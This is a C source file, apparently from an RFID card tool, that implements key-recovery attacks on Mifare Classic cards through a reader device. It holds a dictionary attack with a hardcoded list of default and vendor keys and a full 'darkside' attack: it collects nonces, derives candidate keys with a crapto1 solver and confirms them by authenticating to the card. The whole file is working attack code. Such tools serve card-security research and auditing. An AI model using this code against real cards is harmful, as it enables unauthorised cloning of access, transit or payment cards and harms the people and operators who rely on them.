#include "crack.h"
#include "session.h"
#include "furui.h"
#include "crypto1.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

/* ---- cmd 13: test a key list, device returns the one that authenticates --- */

int furui_check_keys(pmpro_dev *dev, uint8_t block, uint8_t type,
                     const uint8_t (*keys)[6], int n, uint8_t found[6])
{
    /* cmd 13 = [13][block][type][count][key0..key{count-1}]. Chunk to keep the
     * packet within the device pack size. Response payload = the working key. */
    const int CHUNK = 80;
    for (int off = 0; off < n; off += CHUNK) {
        int cnt = n - off < CHUNK ? n - off : CHUNK;
        uint8_t p[4 + CHUNK * 6], resp[FURUI_MAXMSG];
        p[0] = 0x13; p[1] = block; p[2] = type; p[3] = (uint8_t)cnt;
        for (int i = 0; i < cnt; i++) memcpy(p + 4 + i * 6, keys[off + i], 6);
        furui_activate(dev);
        size_t r = furui_exec(dev, p, 4 + cnt * 6, resp, sizeof resp, 6000);
        /* found-key response is [len][01][key(6)][crc] -> len >= 11 */
        if (r >= 11 && resp[2] == 1) {
            memcpy(found, resp + 3, 6);
            /* a real key is not all-zero/all-FF-with-no-auth artifact: accept it,
             * the device only returns a key that actually authenticated. */
            return 1;
        }
    }
    return 0;
}

/* Common Mifare Classic keys (factory/transport/known-vendor). */
static const uint8_t DICT[][6] = {
    {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, {0x00,0x00,0x00,0x00,0x00,0x00},
    {0xA0,0xA1,0xA2,0xA3,0xA4,0xA5}, {0xD3,0xF7,0xD3,0xF7,0xD3,0xF7},
    {0xB0,0xB1,0xB2,0xB3,0xB4,0xB5}, {0x4D,0x3A,0x99,0xC3,0x51,0xDD},
    {0x1A,0x98,0x2C,0x7E,0x45,0x9A}, {0xAA,0xBB,0xCC,0xDD,0xEE,0xFF},
    {0x00,0x00,0x00,0x00,0x00,0x01}, {0xA0,0xB0,0xC0,0xD0,0xE0,0xF0},
    {0xA1,0xB1,0xC1,0xD1,0xE1,0xF1}, {0x71,0x4C,0x5C,0x88,0x6E,0x97},
    {0x58,0x7E,0xE5,0xF9,0x35,0x0F}, {0xA0,0x47,0x8C,0xC3,0x90,0x91},
    {0x53,0x3C,0xB6,0xC7,0x23,0xF6}, {0x8F,0xD0,0xA4,0xF2,0x56,0xE9},
    {0x00,0x00,0x00,0x00,0x00,0x02}, {0x12,0x34,0x56,0x78,0x9A,0xBC},
    {0x11,0x11,0x11,0x11,0x11,0x11}, {0x22,0x22,0x22,0x22,0x22,0x22},
};

int furui_dict_attack(pmpro_dev *dev, uint8_t block, uint8_t type, uint8_t found[6])
{
    return furui_check_keys(dev, block, type, DICT,
                            (int)(sizeof DICT / 6), found);
}

/* ---- darkside collection (cmd 15) ------------------------------------- */

size_t furui_collect_darkside(pmpro_dev *dev, uint8_t block, uint8_t type,
                              uint8_t *out, size_t cap)
{
    uint8_t resp[FURUI_MAXMSG], a10[1] = {0x10};
    furui_exec(dev, a10, 1, resp, sizeof resp, 2000);          /* activate */
    uint8_t p[3] = {0x15, block, type};
    size_t r = furui_exec(dev, p, 3, resp, sizeof resp, 9000); /* collect */
    if (r < 3 || resp[2] != 1)
        return 0;
    size_t dlen = r > 5 ? r - 5 : 0;     /* strip [len][code] + [crc] */
    if (dlen > cap) dlen = cap;
    memcpy(out, resp + 3, dlen);
    return dlen;
}

/* ---- full darkside: collect -> crapto1 -> confirm with cmd 13 ---------- */

int furui_darkside(pmpro_dev *dev, uint8_t block, uint8_t type, uint8_t found[6],
                   char *status, size_t scap)
{
    uint8_t data[2048];
    size_t n = furui_collect_darkside(dev, block, type, data, sizeof data);

    /* The native solver parses: uid @[0..3], record count @[8], 20-byte nonce
     * records starting @[0x10]. A hardened card returns only a few bytes. */
    if (n < 0x10 + 20) {
        snprintf(status, scap,
                 "card not vulnerable to darkside (cmd15 returned %zu bytes, no "
                 "nonce records)", n);
        return 0;
    }

    uint32_t uid = (uint32_t)data[0] << 24 | (uint32_t)data[1] << 16 |
                   (uint32_t)data[2] << 8 | data[3];
    int recs = data[8];
    if (recs <= 0 || (size_t)(0x10 + recs * 0x14) > n) {
        snprintf(status, scap, "collected %zu bytes but record count invalid (%d)",
                 n, recs);
        return 0;
    }

    /* Generate candidate keys from each record with the crapto1 solver, then
     * CONFIRM via cmd 13 (so a wrong field-mapping can never yield a false key —
     * at worst we recover nothing). The 20-byte record offsets are from the
     * documented cmd-15 layout (see PROTOCOL.md); share collected hex to refine
     * if a vulnerable card recovers nonces but no key. */
    int confirmed = 0;
    for (int i = 0; i < recs && !confirmed; i++) {
        const uint8_t *rec = data + 0x10 + i * 0x14;
        uint32_t nt = (uint32_t)rec[3] | (uint32_t)rec[2] << 8 |
                      (uint32_t)rec[1] << 16 | (uint32_t)rec[0] << 24;
        uint32_t ks = (uint32_t)rec[4] | (uint32_t)rec[5] << 8 |
                      (uint32_t)rec[6] << 16 | (uint32_t)rec[7] << 24;

        uint32_t cnt = 0;
        uint64_t *cands = cr1_lfsr_recovery32(ks, nt, &cnt);
        if (!cands) continue;

        /* roll each candidate back by uid^nt to the key, batch-verify via cmd13 */
        enum { BATCH = 80 };
        uint8_t keys[BATCH][6];
        int kn = 0;
        for (uint32_t c = 0; c < cnt && !confirmed; c++) {
            Crypto1State s; cr1_init(&s, cands[c]);
            cr1_rollback_word(&s, uid ^ nt, 0);
            uint64_t k = cr1_state_to_key(&s);
            for (int b = 0; b < 6; b++) keys[kn][b] = (uint8_t)(k >> ((5 - b) * 8));
            if (++kn == BATCH) {
                if (furui_check_keys(dev, block, type, keys, kn, found)) confirmed = 1;
                kn = 0;
            }
        }
        if (!confirmed && kn > 0 &&
            furui_check_keys(dev, block, type, keys, kn, found))
            confirmed = 1;
        free(cands);
    }

    if (confirmed)
        snprintf(status, scap, "recovered & confirmed key from %d nonce record(s)", recs);
    else
        snprintf(status, scap,
                 "collected %d nonce record(s) but no key confirmed — share the "
                 "collected hex to refine the record mapping", recs);
    return confirmed;
}
